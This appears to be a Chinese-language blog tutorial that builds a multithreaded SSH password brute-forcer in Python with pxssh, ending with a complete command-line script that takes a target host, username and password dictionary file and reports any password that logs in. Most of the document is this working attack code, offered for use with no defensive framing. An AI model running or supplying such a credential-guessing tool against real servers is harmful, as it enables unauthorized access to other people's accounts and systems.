# 利用pxssh暴力破解ssh密码
> ==关于pxssh==
> pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。

####利用pxssh的login函数判断密码是否正确
由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）

```Python
def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print('[+]Password Found:'+password)
    except Exception,e:
        print ('[-] Error Connecting:'+str(e))
    finally:
        connection_lock.release()
```

####多线程和信号量
由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。

```Python
password_file = open(password,'r')
for line in password_file:
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()
```
可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:

```Python
maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)
password_file = open(password,'r')
for line in password_file:
   password = line.strip('\r').strip('\n')
   connection_lock.acquire()
   print('[-] Testing password:'+str(password))
   thread = threading.Thread(target=connect,args=(host,user,password))
   thread.start()
```
最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。

####测试结果
![2016-06-29_14667836697742.jpg](http://pic.mylonly.com/2016-06-29_14667836697742.jpg)
字典文件可以自己生成，或者网上找一些常用字典文件
####完整代码
```Python
from pexpect import pxssh
import threading
import optparse
import time

maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)

def send_command(child,cmd):
    child.sendline(cmd)
    child.prompt()
    print(child.before)

def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print('[+]Password Found:'+password)
    except Exception,e:
        print ('[-] Error Connecting:'+str(e))
    finally:
        connection_lock.release()

def main():
    
    parse = optparse.OptionParser('Usage %prog '+ \
        '-H <target host> -u <user> -F <password file>')
    parse.add_option('-H',dest='host',type='string',help='specify target host')
    parse.add_option('-u',dest='user',type='string',help='specify username')
    parse.add_option('-F',dest='password',type='string',help='specify password file')
    (options,args) = parse.parse_args()

    host = options.host
    user = options.user
    password = options.password

    password_file = open(password,'r')

    for line in password_file:
        password = line.strip('\r').strip('\n')
        connection_lock.acquire()
        print('[-] Testing password:'+str(password))
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()

if __name__ == '__main__':
    main()

```

